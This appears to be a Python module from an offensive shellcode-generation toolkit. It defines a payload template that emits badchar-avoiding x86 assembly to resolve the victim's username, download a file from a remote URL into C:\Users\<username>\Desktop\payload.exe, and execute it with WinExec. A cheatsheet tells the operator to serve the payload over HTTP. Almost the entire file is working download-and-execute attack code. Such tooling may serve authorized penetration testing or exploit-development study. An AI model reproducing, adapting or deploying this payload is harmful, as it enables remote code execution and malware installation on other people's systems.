"""Download-to-userpath payload template.

Resolves the current username at runtime via GetUserNameA, builds a
user-specific destination path (prefix + username + suffix), downloads
a file from a URL using URLDownloadToFileA, and executes it with WinExec.

This is a self-contained template. It does not modify or depend on
copy_file, tcp_download, http_download, or get_username templates.

Required functions: LoadLibraryA, GetUserNameA, URLDownloadToFileA, WinExec
Required variables: username_len, path_buf_ptr
Required strings:   advapi_dll, urlmon_dll, path_prefix, path_suffix, url
"""
from __future__ import annotations

from ..encode import (
    safe_call_mem,
    safe_lea,
    safe_mem_load,
    safe_mem_store,
    safe_push_imm,
)
from .base import PayloadTemplate, TemplateConfig


class DownloadToUserpathTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        get_user_off = -layout.slot("GetUserNameA").offset
        urldl_off    = -layout.slot("URLDownloadToFileA").offset
        winexec_off  = -layout.slot("WinExec").offset

        ulen_off = -layout.slot("username_len").offset
        pbuf_off = -layout.slot("path_buf_ptr").offset

        prefix_off = -layout.slot("path_prefix").offset
        suffix_off = -layout.slot("path_suffix").offset
        url_off    = -layout.slot("url").offset

        prefix_str = "C:\\Users\\"
        suffix_str = config.dst_path_suffix if hasattr(config, "dst_path_suffix") else "\\Desktop\\payload.exe"
        prefix_len = len(prefix_str)
        suffix_len = len(suffix_str) + 1

        return "\n".join([
            "; -- Download to User Path --",
            "; Phase 1: resolve username and build destination path",
            "; Phase 2: URLDownloadToFileA(url, path)",
            "; Phase 3: WinExec(path)",
            "",
            "    ; --- Phase 1: Build path ---",
            "",
            "    ; Step 0: carve 128-byte buffer below ESP",
            "    sub  esp, 128",
            "    mov  edi, esp",
            *safe_mem_store("ebp", pbuf_off, "edi", bc),
            "",
            f"    ; Step 1: copy prefix ({prefix_len} bytes)",
            *safe_lea("esi", "ebp", prefix_off, bc),
            *safe_mem_load("edi", "ebp", pbuf_off, bc),
            f"    mov  ecx, {prefix_len}",
            "    rep  movsb",
            "",
            "    ; Step 2: GetUserNameA writes username after prefix",
            f"    mov  dword [ebp{ulen_off:+d}], 64",
            *safe_lea("eax", "ebp", ulen_off, bc),
            "    push eax                    ; pcbBuffer",
            "    push edi                    ; lpBuffer",
            *safe_call_mem("ebp", get_user_off, bc),
            "",
            "    ; Step 3: advance past username",
            f"    mov  ecx, [ebp{ulen_off:+d}]",
            "    dec  ecx                    ; exclude null",
            *safe_mem_load("edi", "ebp", pbuf_off, bc),
            f"    add  edi, {prefix_len}",
            "    add  edi, ecx",
            "",
            f"    ; Step 4: append suffix ({suffix_len} bytes incl. null)",
            *safe_lea("esi", "ebp", suffix_off, bc),
            f"    mov  ecx, {suffix_len}",
            "    rep  movsb",
            "",
            "    ; --- Phase 2: Download file ---",
            "",
            "    ; URLDownloadToFileA(NULL, &url, &path_buf, 0, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpfnCB = NULL",
            "    push eax                    ; dwReserved = 0",
            *safe_mem_load("ebx", "ebp", pbuf_off, bc),
            "    push ebx                    ; szFileName = path_buf",
            *safe_lea("ecx", "ebp", url_off, bc),
            "    push ecx                    ; szURL",
            "    xor  eax, eax",
            "    push eax                    ; pCaller = NULL",
            *safe_call_mem("ebp", urldl_off, bc),
            "",
            "    ; --- Phase 3: Execute ---",
            "",
            "    ; WinExec(path_buf, SW_SHOWNORMAL)",
            *safe_mem_load("eax", "ebp", pbuf_off, bc),
            *safe_push_imm(0x1, bc),
            "    push eax                    ; lpCmdLine",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Host the payload file", "python3 -m http.server 80  (serve payload.exe)"),
            ("Path built on target", "C:\\Users\\<username>\\Desktop\\payload.exe"),
            ("URL fetched", "configured in manifest 'url' string"),
        ]
